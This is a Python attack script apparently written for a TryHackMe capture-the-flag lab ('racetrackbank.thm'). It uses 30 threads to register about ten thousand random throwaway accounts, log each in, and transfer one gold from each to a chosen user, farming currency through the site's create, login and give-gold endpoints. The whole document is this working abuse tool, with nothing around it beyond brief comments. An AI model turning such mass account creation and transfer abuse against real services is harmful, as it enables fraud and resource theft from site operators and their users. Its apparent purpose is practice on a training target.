import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import random, string

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

BASE_URL = "http://racetrackbank.thm"

CREATE_URL = f"{BASE_URL}/api/create"
LOGIN_URL  = f"{BASE_URL}/api/login"
GIVE_URL   = f"{BASE_URL}/api/givegold"

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE_URL,
}

TARGET_USER = "a"
PASSWORD = "a"

gold_counter = 0
lock = threading.Lock()

def farm_gold(username):
    global gold_counter
    session = requests.Session()

    # create
    session.post(CREATE_URL, headers=HEADERS, data={
        "username": username,
        "password": PASSWORD,
        "password2": PASSWORD
    })

    # login
    session.post(LOGIN_URL, headers=HEADERS, data={
        "username": username,
        "password": PASSWORD
    })

    # give gold
    r = session.post(GIVE_URL, headers=HEADERS, data={
        "user": TARGET_USER,
        "amount": 1
    })

    if r.status_code == 200:
        with lock:
            gold_counter += 1
            if gold_counter % 100 == 0:
                print(f"[+] Gold earned: {gold_counter}")

# -------- CONFIG --------
START = 1
END = 10000          # number of users / gold
THREADS = 30         # adjust if needed (20–50 is usually safe)

# -------- RUN --------
with ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = [
        executor.submit(farm_gold, rand_str(10))
        for i in range(START, END + 1)
    ]

    for _ in as_completed(futures):
        pass

print(f"[✓] Done. Total gold earned: {gold_counter}")
